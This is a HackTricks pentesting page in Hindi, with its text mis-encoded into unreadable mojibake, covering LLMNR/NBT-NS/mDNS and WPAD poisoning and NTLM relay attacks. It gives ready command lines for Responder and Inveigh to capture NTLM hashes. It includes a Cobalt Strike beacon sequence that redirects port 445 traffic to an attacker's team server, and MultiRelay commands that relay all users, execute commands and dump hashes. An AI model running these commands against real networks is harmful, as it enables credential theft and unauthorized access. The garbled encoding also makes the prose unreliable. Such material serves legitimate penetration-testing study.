# Spoofing LLMNR, NBT-NS, mDNS/DNS рдФрд░ WPAD рдФрд░ рд░рд┐рд▓реЗ рдЕрдЯреИрдХ

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рд╕реЗ рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕**](https://github.com/carlospolop/hacktricks) рдФрд░ [**рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
{% endhint %}

## рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓

### рд╕реНрдерд╛рдиреАрдп рд╣реЛрд╕реНрдЯ рд╕рдВрдХреЗрддрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓
- **LLMNR, NBT-NS, рдФрд░ mDNS**:
- рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдФрд░ рдЕрдиреНрдп рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо LLMNR рдФрд░ NBT-NS рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реНрдерд╛рдиреАрдп рдирд╛рдо рд╕рдВрдХреЗрддрди рдХреЗ рд▓рд┐рдП рдХрд░рддреЗ рд╣реИрдВ рдЬрдм DNS рд╡рд┐рдлрд▓ рд╣реЛрддрд╛ рд╣реИред рдЙрд╕реА рддрд░рд╣, Apple рдФрд░ Linux рд╕рд┐рд╕реНрдЯрдо mDNS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред
- рдпреЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЕрдкрдиреЗ рдЕрдереЗрдВрдЯрд┐рдХреЗрдЯреЗрдб, рдпреВрдбреАрдкреА рдкрд░ рдкреНрд░рд╕рд╛рд░рд┐рдд рдкреНрд░рдХреГрддрд┐ рдХреЗ рдХрд╛рд░рдг рдЕрдВрддрд░реНрджреГрд╖реНрдЯрд┐ рдФрд░ рд╕реНрдкреВрдлрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИрдВред
- [Responder](https://github.com/lgandx/Responder) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реЛрд╕реНрдЯ рдЬреЛ рдЗрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓реЛрдВ рдХрд╛ рдкреНрд░рд╢реНрди рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдХреЛ рдЭреВрдареЗ рдЬрд╡рд╛рдм рднреЗрдЬрдХрд░ рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
- Responder рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реЗрд╡рд╛ рдЕрдиреБрдХрд░рдг рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдБ](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

### рд╡реЗрдм рдкреНрд░реЙрдХреНрд╕реА рдСрдЯреЛ-рдбрд┐рд╕реНрдХрд╡рд░реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (WPAD)
- WPAD рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЦреЛрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
- рдЦреЛрдЬ DHCP, DNS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдпрд╛ DNS рд╡рд┐рдлрд▓ рд╣реЛрдиреЗ рдкрд░ LLMNR рдФрд░ NBT-NS рдореЗрдВ рд▓реМрдЯрддрд╛ рд╣реИред
- Responder WPAD рдЕрдЯреИрдХ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЛ рджреБрд░реБрдкрдпреЛрдЧреА WPAD рд╕рд░реНрд╡рд░реЛрдВ рдкрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред

### рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдкреЙрдЗрдЬрдирд┐рдВрдЧ рдХреЗ рд▓рд┐рдП Responder
- **Responder** рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ LLMNR, NBT-NS, рдФрд░ mDNS рдХреНрд╡реЗрд░реА рдХреЗ рд▓рд┐рдП рдкреЙрдЗрдЬрдирд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдкреНрд░рд╢реНрди рдкреНрд░рдХрд╛рд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЪреБрдирдХрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрддрд╛ рд╣реИ, рдореБрдЦреНрдп рд░реВрдк рд╕реЗ SMB рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред
- рдпрд╣ Kali Linux рдореЗрдВ рдкреВрд░реНрд╡-рд╕реНрдерд╛рдкрд┐рдд рд╣реИ, `/etc/responder/Responder.conf` рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
- Responder рджреНрд╡рд╛рд░рд╛ рджрд░реНрдЬ рдХрд┐рдП рдЧрдП рд╣реИрд╢ рд╕реНрдХреНрд░реАрди рдкрд░ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрдиреНрд╣реЗрдВ `/usr/share/responder/logs` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╕рд╣реЗрдЬрддрд╛ рд╣реИред
- рдпрд╣ IPv4 рдФрд░ IPv6 рджреЛрдиреЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред
- Responder рдХрд╛ Windows рд╕рдВрд╕реНрдХрд░рдг [рдпрд╣рд╛рдБ](https://github.com/lgandx/Responder-Windows) рдЙрдкрд▓рдмреНрдз рд╣реИред

#### Responder рдЪрд▓рд╛рдирд╛
- рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЗ рд╕рд╛рде Responder рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП: `responder -I <Interface>`
- рдЕрдзрд┐рдХ рдкреНрд░реЛрдмрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП (рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡реЛрдВ рдХреЗ рд╕рд╛рде): `responder -I <Interface> -P -r -v`
- NTLMv1 рдЪреИрд▓реЗрдВрдЬ/рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдХреНрд░реИрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддрдХрдиреАрдХреЗрдВ: `responder -I <Interface> --lm --disable-ess`
- WPAD рдЕрдиреБрдХрд░рдг рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП: `responder -I <Interface> --wpad`
- NetBIOS рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╣рдорд▓рд╡рд░ рдХреЗ IP рдкрд░ рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: `responder.py -I <interface> -Pv`

### Responder рдХреЗ рд╕рд╛рде DHCP рдкреЙрдЗрдЬрдирд┐рдВрдЧ
- DHCP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдЭреВрдард▓рд╛рдиреЗ рд╕реЗ рдПрдХ рдкреАрдбрд╝рд┐рдд рдХрд╛ рд░реВрдЯрд┐рдВрдЧ рд╕реВрдЪрдирд╛ рд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рдкреЙрдЗрдЬрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, ARP рдкреЙрдЗрдЬрдирд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдПрдХ рдЧреБрдкреНрдд рд╡рд┐рдХрд▓реНрдк рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
- рдЗрд╕реЗ рд▓рдХреНрд╖реНрдп рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЗ рд╕рдЯреАрдХ рдЬреНрдЮрд╛рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
- рд╣рдорд▓реЗ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП: `./Responder.py -I eth0 -Pdv`
- рдпрд╣ рд╡рд┐рдзрд┐ NTLMv1/2 рд╣реИрд╢ рдХреЛ рдкреНрд░рднрд╛рд╡реА рдврдВрдЧ рд╕реЗ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдиреЗрдЯрд╡рд░реНрдХ рд╡рд┐рдШрдЯрди рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рд╛рд╡рдзрд╛рдиреА рд╕реЗ рд╣реИрдВрдбрд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

### Responder рдХреЗ рд╕рд╛рде рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреИрдкреНрдЪрд░
- Responder рдЙрдкрд░реЛрдХреНрдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░реЗрдЧрд╛, рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░реЗрдЧрд╛ (рд╕рд╛рдорд╛рдиреНрдпрдд: NTLMv2 рдЪреИрд▓реЗрдВрдЬ/рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛) рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЭреВрдареА рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИред
- рдХреНрд░реИрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП NTLMv1 рдпрд╛ ESS рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдиреЗрдЯNTLMv1 рдХреА рдУрд░ рдбрд╛рдЙрдирдЧреНрд░реЗрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред

рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдЗрди рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд╛рдиреВрдиреА рдФрд░ рдиреИрддрд┐рдХ рд░реВрдк рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рд╕рд╣реА рдЕрдзрд┐рдХрд╛рд░рд┐рдХрд░рдг рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реБрдП рдФрд░ рдЕрд╡реИрдз рдкрд╣реБрдВрдЪ рдпрд╛ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рд╕реЗ рдмрдЪрддреЗ рд╣реБрдПред

## Inveigh

Inveigh рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ рдкреЗрдиреЗрдЯреНрд░реЗрд╢рди рдЯреЗрд╕реНрдЯрд░реНрд╕ рдФрд░ рд░реЗрдб рдЯреАрдорд░реНрд╕ рдХреЗ рд▓рд┐рдП, рд╡рд┐рдВрдбреЛрдЬ рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ Responder рдХреЗ рд╕рдорд╛рди рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рд╕реНрдкреВрдлрд┐рдВрдЧ рдФрд░ рдореИрди-рдЗрди-рдж-рдорд┐рдбрд▓ рд╣рдорд▓реЗ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЙрдкрдХрд░рдг рдПрдХ PowerShell рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕реЗ C# рдмрд╛рдЗрдирд░реА рдореЗрдВ рд╡рд┐рдХрд╕рд┐рдд рд╣реБрдЖ рд╣реИ, [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) рдФрд░ [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) рдореБрдЦреНрдп рд╕рдВрд╕реНрдХрд░рдг рд╣реИрдВред рд╡рд┐рд╕реНрддреГрдд рдкреИрд░рд╛рдореАрдЯрд░ рдФрд░ рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЛ [**рд╡рд┐рдХрд┐**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

Inveigh рдХреЛ PowerShell рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
рдпрд╛ C# рдмрд╛рдЗрдирд░реА рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд:
```bash
Inveigh.exe
```
### NTLM рд░рд┐рд▓реЗ рд╣рдорд▓рд╛

рдпрд╣ рд╣рдорд▓рд╛ SMB рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рддреНрд░реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдПрдХ рд▓рдХреНрд╖реНрдп рдорд╢реАрди рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП, рд╕рдлрд▓ рд╣реЛрдиреЗ рдкрд░ рдПрдХ рд╕рд┐рд╕реНрдЯрдо рд╢реИрд▓ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдореБрдЦреНрдп рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:
- рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд░рд┐рд▓реЗ рд╣реЛрд╕реНрдЯ рдкрд░ рд╕реНрдерд╛рдиреАрдп рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдПрдХреНрд╕реЗрд╕ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред
- SMB рд╕рд╛рдЗрдирд┐рдВрдЧ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

#### 445 рдкреЛрд░реНрдЯ рдлреЙрд░рд╡рд░реНрдбрд┐рдВрдЧ рдФрд░ рдЯрдирд▓рд┐рдВрдЧ

рдЙрди рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдБ рд╕реАрдзрд╛ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рд┐рдЪрдп рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ, рдкреЛрд░реНрдЯ 445 рдкрд░ рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдлреЙрд░рд╡рд░реНрдб рдФрд░ рдЯрдирд▓ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред [**PortBender**](https://github.com/praetorian-inc/PortBender) рдЬреИрд╕реЗ рдЙрдкрдХрд░рдг рд╕рд╣рд╛рдпрдХ рд╣реЛрддреЗ рд╣реИрдВ рдкреЛрд░реНрдЯ 445 рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдПрдХ рдФрд░ рдкреЛрд░реНрдЯ рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдиреЗ рдореЗрдВ, рдЬреЛ рдЬрд░реБрд░реА рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдбреНрд░рд╛рдЗрд╡рд░ рд▓реЛрдбрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рд╕реНрдерд╛рдиреАрдп рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдПрдХреНрд╕реЗрд╕ рдЙрдкрд▓рдмреНрдз рд╣реЛред

рдХреЛрдмрд╛рд▓реНрдЯ рд╕реНрдЯреНрд░рд╛рдЗрдХ рдореЗрдВ PortBender рд╕реЗрдЯрдЕрдк рдФрд░ рдСрдкрд░реЗрд╢рди:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рдЙрдкрдХрд░рдг

- **Metasploit**: рдкреНрд░реЙрдХреНрд╕реА, рд╕реНрдерд╛рдиреАрдп рдФрд░ рджреВрд░рд╕реНрде рд╣реЛрд╕реНрдЯ рд╡рд┐рд╡рд░рдг рдХреЗ рд╕рд╛рде рд╕реЗрдЯрдЕрдк рдХрд░реЗрдВред
- **smbrelayx**: SMB рд╕рддреНрд░реЛрдВ рдХреЛ рд░рд┐рд▓реЗ рдХрд░рдиреЗ рдФрд░ рдХрдорд╛рдВрдб рдпрд╛ рдмреИрдХрдбреЛрдЕрд░ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ Python рд╕реНрдХреНрд░рд┐рдкреНрдЯред
- **MultiRelay**: рдПрдХ рдЙрдкрдХрд░рдг Responder рд╕реБрдЗрдЯ рд╕реЗ, рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдпрд╛ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд░рд┐рд▓реЗ рдХрд░рдиреЗ, рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ, рдпрд╛ рд╣реИрд╢ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

рдкреНрд░рддреНрдпреЗрдХ рдЙрдкрдХрд░рдг рдХреЛ рдпрджрд┐ рдЖрд╡рд╢реНрдпрдХ рд╣реЛ рддреЛ рдПрдХ SOCKS рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрдЪрд╛рд▓рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдЕрдкреНрд░рддреНрдпрдХреНрд╖ рдиреЗрдЯрд╡рд░реНрдХ рдПрдХреНрд╕реЗрд╕ рдХреЗ рд╕рд╛рде рднреА рд╣рдорд▓реЗ рдХреЛ рд╕рдВрднрд╛рд╡рд┐рдд рдмрдирд╛рддрд╛ рд╣реИред

### MultiRelay рдСрдкрд░реЗрд╢рди

MultiRelay рдХреЛ _**/usr/share/responder/tools**_ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗ рдирд┐рд░реНрд╡рд╛рд╣рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЖрдИрдкреА рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд▓рдХреНрд╖реНрдп рдмрдирд╛рддреЗ рд╣реБрдПред
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
### рдПрдирдЯреАрдПрд▓рдПрдо рд░рд┐рд▓реЗ рд╣рдорд▓реЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ

Windows рдореЗрдВ рдЖрдк **рдХреБрдЫ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рдЦрд╛рддреЛрдВ рдХреЛ рдЕрдирд┐рдпрдорд┐рдд рдорд╢реАрдиреЛрдВ рдкрд░ рдкреНрд░рдорд╛рдгреАрдХреГрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ**ред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреЛ рдкрдврд╝реЗрдВ рдФрд░ рдЬрд╛рдиреЗрдВ рдХреИрд╕реЗ:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## рд╕рдВрджрд░реНрдн
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдХреЛ** **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
{% endhint %}
